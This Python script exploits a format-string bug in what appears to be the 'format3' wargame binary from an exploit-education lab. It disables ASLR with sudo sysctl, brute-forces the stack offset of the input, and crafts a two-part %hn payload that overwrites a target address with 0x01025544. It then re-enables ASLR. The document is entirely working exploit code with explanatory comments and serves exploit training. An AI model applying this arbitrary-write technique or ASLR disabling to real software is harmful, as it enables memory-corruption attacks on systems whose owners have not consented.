#!/usr/bin/python3

import subprocess
import struct

# It is required to disable ASLR, because otherwise, we don't know where our format string is on the stack.
# We need to know where it is so that we can control the address that we are using %n to write to.
subprocess.run(["sudo","sysctl","kernel.randomize_va_space=0"])

offset = -1

for i in range(1,180):
    output = subprocess.run(["../Binaries/format3"], input=("AAAA %"+str(i)+"$8x").encode("utf8","surrogateescape"), stdout=subprocess.PIPE).stdout.decode("utf8")
    if "41414" in output:
        print(output)
        offset = i
        break
    
print("Found offset =", offset)

# Run the exploit
# Address of first WORD for %hn
address   = struct.pack("<L", 0x080496f4+2).decode("utf8", "surrogateescape")
# Address of second WORD for %hn
address_2 = struct.pack("<L", 0x080496f4+0).decode("utf8", "surrogateescape")
x = 0x0102 - 0x8    # Minus eight because we wrote two four-byte addresses...
y = 0x5544 - 0x0102 # At this point, we will have written 0x0102 bytes, so we need to write whatever the difference is to get to 0x5544
value_we_want = 0x01025544 # This is 0x0102 and 0x5544 we would like to write as WORDS using %hn

proc = subprocess.run(["../Binaries/format3"],  input=(address + address_2 + 
                                                       "%"+str(x)+"c" + "%" + str(offset) + "$hn" +
                                                       "%"+str(y)+"c" + "%" + str(offset+1) + "$hn").encode("utf8","surrogateescape"), stdout=subprocess.PIPE)
print(proc)

# Reenable ASLR
subprocess.run(["sudo","sysctl","kernel.randomize_va_space=2"])